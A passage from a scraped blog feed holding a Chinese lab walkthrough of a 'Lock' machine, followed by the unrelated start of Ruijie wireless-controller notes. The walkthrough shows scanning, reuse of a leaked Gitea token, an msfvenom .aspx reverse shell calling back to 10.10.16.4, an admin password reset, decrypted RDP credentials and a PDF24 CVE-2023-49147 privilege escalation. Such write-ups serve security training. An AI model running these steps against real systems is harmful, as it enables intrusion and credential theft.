&lt;html\\x20lang=\\\"en-US\\\"\\x20class=\\\"theme-\nSF:auto\\\"&gt;\\n&lt;head&gt;\\n\\t&lt;meta\\x20name=\\\"viewport\\\"\\x20content=\\\"width=device\nSF:-width,\\x20initial-scale=1\\\"&gt;\\n\\t&lt;title&gt;Gitea:\\x20Git\\x20with\\x20a\\x20c\nSF:up\\x20of\\x20tea&lt;/title&gt;\\n\\t&lt;link\\x20rel=\\\"manifest\\\"\\x20href=\\\"data:app\nSF:lication/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYS\nSF:IsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfd\nSF:XJsIjoiaHR0cDovL2xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi8v\nSF:bG9jYWxob3N0OjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmc\nSF:iLCJzaXplcyI6IjU\")%r(Help,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nCon\nSF:tent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\\nSF:r\\n400\\x20Bad\\x20Request\")%r(HTTPOptions,197,\"HTTP/1\\.0\\x20405\\x20Metho\nSF:d\\x20Not\\x20Allowed\\r\\nAllow:\\x20HEAD\\r\\nAllow:\\x20GET\\r\\nCache-Control\nSF::\\x20max-age=0,\\x20private,\\x20must-revalidate,\\x20no-transform\\r\\nSet-\nSF:Cookie:\\x20i_like_gitea=c9a200de20c43a71;\\x20Path=/;\\x20HttpOnly;\\x20Sa\nSF:meSite=Lax\\r\\nSet-Cookie:\\x20_csrf=_WL4mnt6F0jUe2zby5-7FVfiMSY6MTc3MTEz\nSF:NzQyMTM0NTI4NDgwMA;\\x20Path=/;\\x20Max-Age=86400;\\x20HttpOnly;\\x20SameSi\nSF:te=Lax\\r\\nX-Frame-Options:\\x20SAMEORIGIN\\r\\nDate:\\x20Sun,\\x2015\\x20Feb\\\nSF:x202026\\x2006:37:01\\x20GMT\\r\\nContent-Length:\\x200\\r\\n\\r\\n\")%r(RTSPRequ\nSF:est,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/pla\nSF:in;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Reque\nSF:st\");\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)\nOS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016\nAggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time: \n|   date: 2026-02-15T06:37:38\n|_  start_date: N/A\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled but not required\n|_clock-skew: mean: 1m57s, deviation: 0s, median: 1m57s\n\nTRACEROUTE (using port 3389/tcp)\nHOP RTT       ADDRESS\n1   349.42 ms 10.10.16.1\n2   349.72 ms 10.129.234.64\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 109.87 seconds\n</code></pre>\n<p>发现开放了4个端口：80、445、3000、3389</p>\n<p><img alt=\"image-20260215144554043\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170442300-1196726848.png\" /></p>\n<p><img alt=\"image-20260215144616821\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170443121-607852831.png\" /></p>\n<p>在左上的探索下，位于公共仓库中有一段python编写的代码</p>\n<p><img alt=\"image-20260215144932716\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170443642-1647566889.png\" /></p>\n<pre><code class=\"language-python\">import requests\nimport sys\nimport os\n\ndef format_domain(domain):\n    if not domain.startswith(('http://', 'https://')):\n        domain = 'https://' + domain\n    return domain\n\ndef get_repositories(token, domain):\n    headers = {\n        'Authorization': f'token {token}'\n    }\n    url = f'{domain}/api/v1/user/repos'\n    response = requests.get(url, headers=headers)\n\n    if response.status_code == 200:\n        return response.json()\n    else:\n        raise Exception(f'Failed to retrieve repositories: {response.status_code}')\n\ndef main():\n    if len(sys.argv) &lt; 2:\n        print(\"Usage: python script.py &lt;gitea_domain&gt;\")\n        sys.exit(1)\n\n    gitea_domain = format_domain(sys.argv[1])\n\n    personal_access_token = os.getenv('GITEA_ACCESS_TOKEN')\n    if not personal_access_token:\n        print(\"Error: GITEA_ACCESS_TOKEN environment variable not set.\")\n        sys.exit(1)\n\n    try:\n        repos = get_repositories(personal_access_token, gitea_domain)\n        print(\"Repositories:\")\n        for repo in repos:\n            print(f\"- {repo['full_name']}\")\n    except Exception as e:\n        print(f\"Error: {e}\")\n\nif __name__ == \"__main__\":\n    main()\n</code></pre>\n<p>这是一个用于通过 Gitea API 获取用户仓库列表的 Python 脚本，通过个人访问令牌进行身份验证。</p>\n<p>核心功能<br />\n身份验证：使用 Gitea 个人访问令牌<br />\nAPI 调用：调用 Gitea 的 /api/v1/user/repos端点<br />\n域名处理：自动添加 HTTPS 协议前缀<br />\n仓库展示：输出用户的所有仓库完整名称</p>\n<p><img alt=\"image-20260215145317851\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170443946-1323051577.png\" /></p>\n<p>查看提交历史，可以看到PERSONAL_ACCESS_TOKEN</p>\n<p><img alt=\"image-20260215145336211\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170444290-2025630397.png\" /></p>\n<pre><code class=\"language-kotlin\">PERSONAL_ACCESS_TOKEN = '43ce39bb0bd6bc489284f2905f033ca467a6362f'\n</code></pre>\n<p>我们将脚本复制到kali里面，并设置环境变量</p>\n<p><img alt=\"image-20260215150556841\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170444621-238580148.png\" /></p>\n<p>我们可以看到有两个仓库：dev-scripts和website</p>\n<p>这里有两个方法</p>\n<p><strong>1.git</strong></p>\n<p>我们已经了解了dev-scripts，所以接下来我们将克隆website仓库。但是现在没有密码，只有token，git允许token当作密码使用，这可以通过使用git clone命令并同时提供访问令牌来完成。</p>\n<pre><code>git clone https://&lt;username&gt;:&lt;token&gt;@&lt;gitea-domain&gt;/&lt;owner&gt;/&lt;repository&gt;.git\n\ngit clone http://43ce39bb0bd6bc489284f2905f033ca467a6362f@10.129.234.64:3000/ellen.freeman/website\n</code></pre>\n<p><img alt=\"image-20260215151010801\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170445070-695726071.png\" /></p>\n<p><img alt=\"image-20260215151141449\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170445843-681213167.png\" /></p>\n<p><strong>2.curl</strong></p>\n<pre><code class=\"language-kotlin\">curl http://10.129.234.64:3000/api/v1/user/repos -H \"Authorization: Bearer 43ce39bb0bd6bc489284f2905f033ca467a6362f\" -s | jq .\n\n\n[\n  {\n    \"id\": 1,\n    \"owner\": {\n      \"id\": 2,\n      \"login\": \"ellen.freeman\",\n      \"login_name\": \"\",\n      \"full_name\": \"\",\n      \"email\": \"ellen.freeman@lock.vl\",\n      \"avatar_url\": \"http://localhost:3000/avatar/1aea7e43e6bb8891439a37854255ed74\",\n      \"language\": \"\",\n      \"is_admin\": false,\n      \"last_login\": \"0001-01-01T00:00:00Z\",\n      \"created\": \"2023-12-27T11:13:10-08:00\",\n      \"restricted\": false,\n      \"active\": false,\n      \"prohibit_login\": false,\n      \"location\": \"\",\n      \"website\": \"\",\n      \"description\": \"\",\n      \"visibility\": \"public\",\n      \"followers_count\": 0,\n      \"following_count\": 0,\n      \"starred_repos_count\": 0,\n      \"username\": \"ellen.freeman\"\n    },\n    \"name\": \"dev-scripts\",\n    \"full_name\": \"ellen.freeman/dev-scripts\",\n    \"description\": \"\",\n    \"empty\": false,\n    \"private\": false,\n    \"fork\": false,\n    \"template\": false,\n    \"parent\": null,\n    \"mirror\": false,\n    \"size\": 29,\n    \"language\": \"Python\",\n    \"languages_url\": \"http://localhost:3000/api/v1/repos/ellen.freeman/dev-scripts/languages\",\n    \"html_url\": \"http://localhost:3000/ellen.freeman/dev-scripts\",\n    \"url\": \"http://localhost:3000/api/v1/repos/ellen.freeman/dev-scripts\",\n    \"link\": \"\",\n    \"ssh_url\": \"ellen.freeman@localhost:ellen.freeman/dev-scripts.git\",\n    \"clone_url\": \"http://localhost:3000/ellen.freeman/dev-scripts.git\",\n    \"original_url\": \"\",\n    \"website\": \"\",\n    \"stars_count\": 0,\n    \"forks_count\": 0,\n    \"watchers_count\": 1,\n    \"open_issues_count\": 0,\n    \"open_pr_counter\": 0,\n    \"release_counter\": 0,\n    \"default_branch\": \"main\",\n    \"archived\": false,\n    \"created_at\": \"2023-12-27T11:17:47-08:00\",\n    \"updated_at\": \"2023-12-27T11:36:42-08:00\",\n    \"archived_at\": \"1969-12-31T16:00:00-08:00\",\n    \"permissions\": {\n      \"admin\": true,\n      \"push\": true,\n      \"pull\": true\n    },\n    \"has_issues\": true,\n    \"internal_tracker\": {\n      \"enable_time_tracker\": true,\n      \"allow_only_contributors_to_track_time\": true,\n      \"enable_issue_dependencies\": true\n    },\n    \"has_wiki\": true,\n    \"has_pull_requests\": true,\n    \"has_projects\": true,\n    \"has_releases\": true,\n    \"has_packages\": true,\n    \"has_actions\": false,\n    \"ignore_whitespace_conflicts\": false,\n    \"allow_merge_commits\": true,\n    \"allow_rebase\": true,\n    \"allow_rebase_explicit\": true,\n    \"allow_squash_merge\": true,\n    \"allow_rebase_update\": true,\n    \"default_delete_branch_after_merge\": false,\n    \"default_merge_style\": \"merge\",\n    \"default_allow_maintainer_edit\": false,\n    \"avatar_url\": \"\",\n    \"internal\": false,\n    \"mirror_interval\": \"\",\n    \"mirror_updated\": \"0001-01-01T00:00:00Z\",\n    \"repo_transfer\": null\n  },\n  {\n    \"id\": 5,\n    \"owner\": {\n      \"id\": 2,\n      \"login\": \"ellen.freeman\",\n      \"login_name\": \"\",\n      \"full_name\": \"\",\n      \"email\": \"ellen.freeman@lock.vl\",\n      \"avatar_url\": \"http://localhost:3000/avatar/1aea7e43e6bb8891439a37854255ed74\",\n      \"language\": \"\",\n      \"is_admin\": false,\n      \"last_login\": \"0001-01-01T00:00:00Z\",\n      \"created\": \"2023-12-27T11:13:10-08:00\",\n      \"restricted\": false,\n      \"active\": false,\n      \"prohibit_login\": false,\n      \"location\": \"\",\n      \"website\": \"\",\n      \"description\": \"\",\n      \"visibility\": \"public\",\n      \"followers_count\": 0,\n      \"following_count\": 0,\n      \"starred_repos_count\": 0,\n      \"username\": \"ellen.freeman\"\n    },\n    \"name\": \"website\",\n    \"full_name\": \"ellen.freeman/website\",\n    \"description\": \"\",\n    \"empty\": false,\n    \"private\": true,\n    \"fork\": false,\n    \"template\": false,\n    \"parent\": null,\n    \"mirror\": false,\n    \"size\": 7370,\n    \"language\": \"CSS\",\n    \"languages_url\": \"http://localhost:3000/api/v1/repos/ellen.freeman/website/languages\",\n    \"html_url\": \"http://localhost:3000/ellen.freeman/website\",\n    \"url\": \"http://localhost:3000/api/v1/repos/ellen.freeman/website\",\n    \"link\": \"\",\n    \"ssh_url\": \"ellen.freeman@localhost:ellen.freeman/website.git\",\n    \"clone_url\": \"http://localhost:3000/ellen.freeman/website.git\",\n    \"original_url\": \"\",\n    \"website\": \"\",\n    \"stars_count\": 0,\n    \"forks_count\": 0,\n    \"watchers_count\": 1,\n    \"open_issues_count\": 0,\n    \"open_pr_counter\": 0,\n    \"release_counter\": 0,\n    \"default_branch\": \"main\",\n    \"archived\": false,\n    \"created_at\": \"2023-12-27T12:04:52-08:00\",\n    \"updated_at\": \"2024-01-18T10:17:46-08:00\",\n    \"archived_at\": \"1969-12-31T16:00:00-08:00\",\n    \"permissions\": {\n      \"admin\": true,\n      \"push\": true,\n      \"pull\": true\n    },\n    \"has_issues\": true,\n    \"internal_tracker\": {\n      \"enable_time_tracker\": true,\n      \"allow_only_contributors_to_track_time\": true,\n      \"enable_issue_dependencies\": true\n    },\n    \"has_wiki\": true,\n    \"has_pull_requests\": true,\n    \"has_projects\": true,\n    \"has_releases\": true,\n    \"has_packages\": true,\n    \"has_actions\": false,\n    \"ignore_whitespace_conflicts\": false,\n    \"allow_merge_commits\": true,\n    \"allow_rebase\": true,\n    \"allow_rebase_explicit\": true,\n    \"allow_squash_merge\": true,\n    \"allow_rebase_update\": true,\n    \"default_delete_branch_after_merge\": false,\n    \"default_merge_style\": \"merge\",\n    \"default_allow_maintainer_edit\": false,\n    \"avatar_url\": \"\",\n    \"internal\": false,\n    \"mirror_interval\": \"\",\n    \"mirror_updated\": \"0001-01-01T00:00:00Z\",\n    \"repo_transfer\": null\n  }\n]\n\n</code></pre>\n<table>\n<thead>\n<tr>\n<th style=\"text-align: left;\">字段</th>\n<th style=\"text-align: left;\">dev-scripts 仓库</th>\n<th style=\"text-align: left;\">website 仓库</th>\n<th style=\"text-align: left;\">渗透测试解读</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align: left;\">仓库 ID</td>\n<td style=\"text-align: left;\">1</td>\n<td style=\"text-align: left;\">5</td>\n<td style=\"text-align: left;\">唯一标识，API 操作时可能用到</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">所属用户</td>\n<td style=\"text-align: left;\">ellen.freeman</td>\n<td style=\"text-align: left;\">ellen.freeman</td>\n<td style=\"text-align: left;\">锁定目标用户，后续可围绕该用户展开枚举</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">仓库全名（full_name）</td>\n<td style=\"text-align: left;\">ellen.freeman/dev-scripts</td>\n<td style=\"text-align: left;\">ellen.freeman/website</td>\n<td style=\"text-align: left;\">克隆 / 访问仓库的核心标识，格式为「用户名 / 仓库名」</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">仓库类型（private）</td>\n<td style=\"text-align: left;\">false（公共）</td>\n<td style=\"text-align: left;\">true（私有）</td>\n<td style=\"text-align: left;\"><code>website</code> 是私有仓库，大概率包含敏感内容（如网站源码、部署脚本），重点关注</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">主要开发语言</td>\n<td style=\"text-align: left;\">Python</td>\n<td style=\"text-align: left;\">CSS</td>\n<td style=\"text-align: left;\">提示仓库内容类型：- dev-scripts：Python 脚本- website：前端 / 网页代码</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">仓库大小</td>\n<td style=\"text-align: left;\">29 KB</td>\n<td style=\"text-align: left;\">7370 KB（约 7.2MB）</td>\n<td style=\"text-align: left;\"><code>website</code> 体积大，内容更丰富，是重点目标</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">权限（permissions）</td>\n<td style=\"text-align: left;\">admin: true / push: true / pull: true</td>\n<td style=\"text-align: left;\">admin: true / push: true / pull: true</td>\n<td style=\"text-align: left;\">你的令牌拥有该仓库的<strong>管理员权限</strong>（可推送 / 修改代码），这是提权关键</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">克隆地址（clone_url）</td>\n<td style=\"text-align: left;\"><a href=\"http://localhost:3000/ellen.freeman/dev-scripts.git\" rel=\"noopener nofollow\" target=\"_blank\">http://localhost:3000/ellen.freeman/dev-scripts.git</a></td>\n<td style=\"text-align: left;\"><a href=\"http://localhost:3000/ellen.freeman/website.git\" rel=\"noopener nofollow\" target=\"_blank\">http://localhost:3000/ellen.freeman/website.git</a></td>\n<td style=\"text-align: left;\">可通过该地址克隆仓库到本地分析内容</td>\n</tr>\n</tbody>\n</table>\n<p>这表明，对该存储库的任何更改都会自动改变正在托管的网站。如果我们查看此目录内的index.html页面，我们会找到我们之前访问的网站的HTML内容。这意味着，我们能够向该存储库提交代码，它将被自动推送到该网站。</p>\n<p>我们改变changelog.txt内容，然后提交后</p>\n<p><img alt=\"image-20260215152533986\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170446301-314526916.png\" /></p>\n<pre><code>git add .\n\ngit commit -m \"mane update\"\n\ngit config --global user.name \"ellen.freeman\"\n\ngit config --global user.email \"ellen.freeman\"\n\ngit push\n\n\n</code></pre>\n<p><img alt=\"image-20260215152638585\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170446608-448487180.png\" /></p>\n<p>这时候再去刷新就可以看到更改了</p>\n<p><img alt=\"image-20260215152659735\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170446910-995116.png\" /></p>\n<h2 id=\"漏洞利用\">漏洞利用</h2>\n<p>既然可以成功修改了服务器的文件，由于从Nmap扫描可以确认Microsoft IIS被用作web服务器</p>\n<p><strong>我们可以上传一个.aspx网页shell以实现远程代码执行。</strong></p>\n<p>我们可以通过msfvenom生成此网页shell</p>\n<pre><code class=\"language-kotlin\">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.4 LPORT=4444 -f aspx &gt; test.aspx\n</code></pre>\n<p><img alt=\"image-20260215152959165\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170447245-1785878927.png\" /></p>\n<p>然后我们使用msfconsole启动监听器，以便在webshell触发后捕获反向shell</p>\n<pre><code>msfconsole -q -x \"use exploit/multi/handler;set PAYLOAD windows/x64/meterpreter/reverse_tcp;set LHOST 10.10.16.4;set LPORT 4444;run\"\n</code></pre>\n<pre><code class=\"language-kotlin\">git add test.aspx\n\ngit commit -m \"reverse shell\"\n\ngit push\n</code></pre>\n<p><img alt=\"image-20260215153401988\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170447555-1594619413.png\" /></p>\n<p>再回到website目录下，去访问test.aspx</p>\n<p><img alt=\"image-20260215153529160\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170447889-460690805.png\" /></p>\n<p>得到shell</p>\n<p>在C:\\Gitea\\data下有一个gitea.db的数据库文件</p>\n<p><strong>我们尝试使用445端口smb共享</strong></p>\n<p><img alt=\"image-20260215154933813\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170448243-2103087620.png\" /></p>\n<p>但是没有权限</p>\n<p><strong>使用gitea命令更改管理员密码</strong></p>\n<pre><code class=\"language-kotlin\">.\\gitea admin user change-password -u administrator -p chenzi123\n</code></pre>\n<p><img alt=\"image-20260215155323788\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170448575-1285427875.png\" /></p>\n<p>发现修改成功</p>\n<p><img alt=\"image-20260215155611256\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170448925-118385955.png\" /></p>\n<p>成功登陆</p>\n<p>但是并没有什么东西</p>\n<p><img alt=\"image-20260215160252187\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170449299-764827878.png\" /></p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align: left;\">字段名</th>\n<th style=\"text-align: left;\">取值</th>\n<th style=\"text-align: left;\">渗透测试解读</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align: left;\"><code>EncryptionEngine</code></td>\n<td style=\"text-align: left;\">AES</td>\n<td style=\"text-align: left;\">密码的加密算法是 AES（GCM 模式），这是解密的关键前提</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\"><code>BlockCipherMode</code></td>\n<td style=\"text-align: left;\">GCM</td>\n<td style=\"text-align: left;\">AES 的分组密码模式，解密工具需要匹配这个模式</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\"><code>KdfIterations</code></td>\n<td style=\"text-align: left;\">1000</td>\n<td style=\"text-align: left;\">密钥派生函数的迭代次数，解密时需要用到</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\"><code>Protected</code></td>\n<td style=\"text-align: left;\">sDkrKn0JrG4oAL4GW8BctmMNAJfcdu/ahPSQn3W5DPC3vPRiNwfo7OH11trVPbhwpy+1FnqfcPQZ3olLRy+DhDFp</td>\n<td style=\"text-align: left;\">mRemoteNG 的主加密密钥（Base64 编码），解密密码必须依赖这个值</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\"><code>Name</code></td>\n<td style=\"text-align: left;\">RDP/Gale</td>\n<td style=\"text-align: left;\">这个连接配置的名称，指向用户 Gale</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\"><code>Username</code></td>\n<td style=\"text-align: left;\">Gale.Dekarios</td>\n<td style=\"text-align: left;\">靶机上的有效用户账号（核心！后续登录 / 提权要用）</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\"><code>Password</code></td>\n<td style=\"text-align: left;\">TYkZkvR2YmVlm2T2jBYTEhPU2VafgW1d9NSdDX+hUYwBePQ/2qKx+57IeOROXhJxA7CczQzr1nRm89JulQDWPw==</td>\n<td style=\"text-align: left;\">该用户的加密密码（Base64 编码），需要解密成明文</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\"><code>Hostname</code></td>\n<td style=\"text-align: left;\">Lock</td>\n<td style=\"text-align: left;\">连接的目标主机名（即靶机本身）</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\"><code>Protocol</code></td>\n<td style=\"text-align: left;\">RDP</td>\n<td style=\"text-align: left;\">连接协议是 RDP（远程桌面），端口 3389</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\"><code>Port</code></td>\n<td style=\"text-align: left;\">3389</td>\n<td style=\"text-align: left;\">RDP 默认端口，解密密码后可尝试远程登录</td>\n</tr>\n</tbody>\n</table>\n<p>加密密码</p>\n<pre><code>TYkZkvR2YmVlm2T2jBYTEhPU2VafgW1d9NSdDX+hUYwBePQ/2qKx+57IeOROXhJxA7CczQzr1nRm89JulQDWPw==\n</code></pre>\n<p><strong>我们可以使用mRemoteNG进行解密</strong></p>\n<pre><code class=\"language-kotlin\">git clone https://github.com/kmahyyg/mremoteng-decrypt\n\npython mremoteng_decrypt.py -rf config.xml\n\n\nUsername: Gale.Dekarios\nHostname: Lock\nPassword: ty8wnW9qCKDosXo6\n</code></pre>\n<p><img alt=\"image-20260215161751842\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170449614-657327311.png\" /></p>\n<p><strong>发现内容信息里有关RDP，成功获取RDP凭据。使用这些凭据，我们可以建立到该机器的RDP会话。</strong></p>\n<pre><code>xfreerdp /v:10.129.234.64 /u:Gale.Dekarios /p:ty8wnW9qCKDosXo6\n</code></pre>\n<p><img alt=\"image-20260215162312243\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170449963-870789338.png\" /></p>\n<p>成功在桌面得到flag</p>\n<h2 id=\"权限提升\">权限提升</h2>\n<p><strong>利用CVE-2023-49147中的PDF24漏洞获取NT系统权限</strong></p>\n<p><img alt=\"image-20260215162609383\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170450488-2097604170.png\" /></p>\n<p><img alt=\"image-20260215163334567\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170450920-2092078689.png\" /></p>\n<p><img alt=\"image-20260215163458580\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170451263-28557071.png\" /></p>\n<p>找到了原始安装文件，接下来还需要SetOpLock</p>\n<pre><code>https://github.com/googleprojectzero/symboliclink-testing-tools/releases/tag/v1.0\n</code></pre>\n<p>下载好后直接复制进来就行</p>\n<p><img alt=\"image-20260215163953620\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170451588-2020905226.png\" /></p>\n<p>成功下载后，我们执行以下命令在PDF24使用的faxPrnlnt.log文件上创建oplock</p>\n<pre><code>.\\SetOpLock.exe \"C:\\Program Files\\PDF24\\faxPrnInst.log\" -r\n</code></pre>\n<p><img alt=\"image-20260215164444656\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170451885-1310209373.png\" /></p>\n<p>在oplock机制启动的情况下，我们打开一个新的命令行窗口，并使用易受攻击的PDF24 MSI安装程序触发修复安装。</p>\n<pre><code>msiexec.exe /fa C:\\_install\\pdf24-creator-11.15.1-x64.msi\n</code></pre>\n<p><img alt=\"image-20260215164843232\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170452203-312618466.png\" /></p>\n<p>一直按确定即可</p>\n<p>在得到这个界面时候</p>\n<p><img alt=\"image-20260215165033124\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170452547-762946933.png\" /></p>\n<p><img alt=\"image-20260215165110265\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170452844-2067885426.png\" /></p>\n<p>使用火狐</p>\n<p>然后启动后，使用ctrl+o 输入cmd</p>\n<p><img alt=\"image-20260215165551218\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170453150-1606390944.png\" /></p>\n<p>得到root</p>\n<p><img alt=\"image-20260215165650040\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170453606-846167594.png\" /></p>\n\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-15 17:05</span>&nbsp;\n<a href=\"https://www.cnblogs.com/DSchenzi\">dynasty_chenzi</a>&nbsp;\n阅读(<span id=\"post_view_count\">43</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "【网络】AC控制器上AP换新并上线命令笔记##2",
      "link": "https://www.cnblogs.com/boluo0423/p/19620604",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/boluo0423/p/19620604\" id=\"cb_post_title_url\" title=\"发布于 2026-02-16 22:35\">\n    <span>【网络】AC控制器上AP换新并上线命令笔记##2</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h1 id=\"网络ac控制器上ap换新并上线命令笔记2\">【网络】AC控制器上AP换新并上线命令笔记##2</h1>\n<hr />\n<p>--作者：李菠萝的多样空间</p>\n<p>--创建时间：2024-12-22</p>\n<p>--更新时间：2026-2-16，修改了重复内容，修改了一些错误，调整了格式。</p>\n<hr />\n<h1 id=\"环境\">环境：</h1>\n<p>远程设备：RG-WS7880，RG-MAP852-SF</p>\n<p>远程工具：SecureCRT</p>\n<p>系统版本：Windows 10</p>\n<hr />\n<h1 id=\"视频讲解\">视频讲解：</h1>\n<p>讲解链接：</p>\n<p><a href=\"https://www.bilibili.com/video/BV1LM411S75g/\" rel=\"noopener nofollow\" target=\"_blank\">【解决方法】AC控制器上将 AP换新并上线 ##2_哔哩哔哩_bilibili</a></p>\n<hr />\n<h1 id=\"命令列表\">命令列表：</h1>\n<p><u>注释：</u></p>\n<p><u>一下命令为锐捷设备，其他厂商同理，命令稍微变化。</u></p>\n<p><u>下列的命令的顺序和日常使用中的顺序基本一致。</u></p>\n<h2 id=\"show-ap-config-summary\">show ap-config summary</h2>\n<p>列出所有创建的 AP 的配置摘要，可用“|”管道符过滤内容</p>\n<p>show ap-config summary</p>\n<p>show ap-config summary | include 1F-2</p>\n<p>show ap-config summary | include 1082.3d07.df4c</p>\n<p>我们可以通过 ap 大致的名称或 Mac 地址查到之前的配置，网络规划中 ap 的名称是有规律的，并且装维人员在通知需要更换时都会给出房间位置，我们可以通过管道符过滤这个名称进行检索，见下图：</p>\n<p><img alt=\"\" src=\"https://picx.zhimg.com/80/v2-263ad9ec8be5d15090e0bf49de11fde3_720w.png?source=ccfced1a\" /></p>\n<p>也可以通过检索原来的 ap 的 Mac 地址，来查询 ap 的名称，从而进行 ap 的配置，见下图：</p>\n<p><img alt=\"\" src=\"https://picx.zhimg.com/80/v2-a19b8a445012ef0a6b00edd1feadba39_720w.png?source=ccfced1a\" /></p>\n<h2 id=\"no-ap-config\">no ap-config</h2>\n<p>删除原先的 ap 配置</p>\n<p>no ap-config 南苑1D_206</p>\n<p><img alt=\"\" src=\"https://picx.zhimg.com/80/v2-3d96d84fc906eb0796f65bb1fe6ba7e3_720w.png?source=ccfced1a\" /></p>\n<h2 id=\"ap-config\">ap-config</h2>\n<p>创建或者进入已经存在的 ap 配置</p>\n<p>ap-config 南苑1D_206 //通过名称进入配置</p>\n<p>ap-config 1082.3d07.df4c //推荐，通过Mac进入配置</p>\n<p>提示：推荐使用 ap 的 Mac 地址进行创建，保证唯一性。若该 ap 的 Mac 地址已经被 某个 ap 的配置摘要绑定，那么使用 ap-config Mac 会自动进入已经绑定该 Mac 的 ap 配置里面。见下图：</p>\n<p><img alt=\"\" src=\"https://pica.zhimg.com/80/v2-0d5de9af041723fb9a8174f7d089a5bf_720w.png?source=ccfced1a\" /></p>\n<h2 id=\"ap-name\">ap-name</h2>\n<p>修改 ap 配置摘要的名称</p>\n<p>ap-name 南苑1D_206</p>\n<p><img alt=\"\" src=\"https://pic1.zhimg.com/80/v2-f624ae55af8902c28725ccf0ea3b8796_720w.png?source=ccfced1a\" /></p>\n<h2 id=\"show-ap-group-summary\">show ap-group summary</h2>\n<p>查看所有已经创建的 ap 组</p>\n<p>show ap-group summary</p>\n<p><img alt=\"\" 